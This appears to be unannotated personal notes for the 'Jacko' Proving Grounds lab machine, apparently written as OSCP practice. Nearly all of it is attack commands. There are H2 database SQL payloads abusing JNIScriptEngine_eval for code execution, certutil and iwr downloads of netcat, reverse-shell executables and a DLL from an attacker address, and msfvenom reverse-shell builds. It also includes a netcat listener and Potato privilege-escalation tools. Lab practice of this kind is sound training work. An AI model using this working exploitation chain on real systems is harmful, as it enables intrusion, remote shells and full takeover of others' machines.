
SELECT FILE_READ('C:\Windows\System32\drivers\etc\hosts', NULL);


```txt
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```


https://www.exploit-db.com/raw/49384

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.59 LPORT=135 -f exe > rev.exe


```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.49.59/nc.exe C:/Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');
```

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.49.59/nc.exe C:/Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.59 LPORT=4444 -f exe -o shell.exe

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";  
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.49.59:80/shell.exe C:\\Users\\tony\\desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');

initial access

https://medium.com/@SilentExploit/jacko-proving-grounds-walkthrough-oscp-preparation-eeb78ef0fb4c


CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()'); 

initial access


C:\Windows\System32\reg.exe query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s /v version


certutil -urlcache -split -f http://192.168.49.59:80/GodPotato-NET4.exe C:\Users\tony\Desktop
https://dsec.blog/jacko-pg/


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.59 LPORT=8082 -f dll > exploit.dll



iwr -uri http://192.168.49.59/49382.ps1 -o C:\temp\49382.ps1

```
iwr -Uri "http://192.168.49.59/49382.ps1" -OutFile "C:\Users\tony\Desktop\49382.ps1"
```

```
iwr -Uri "http://192.168.49.59/exploit.dll" -OutFile "C:\Users\tony\Desktop\exploit.dll"
```

.\49382.ps1


https://dsec.blog/jacko-pg/

sudo nc -lvnp 8082

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.59 LPORT=8082 -f exe > shell.exe

iwr -uri http://192.168.49.59/shell.exe -o C:\temp\shell.exe

iwr -uri http://192.168.49.59/JuicyPotatoNG.exe -o C:\temp\JuicyPotatoNG.exe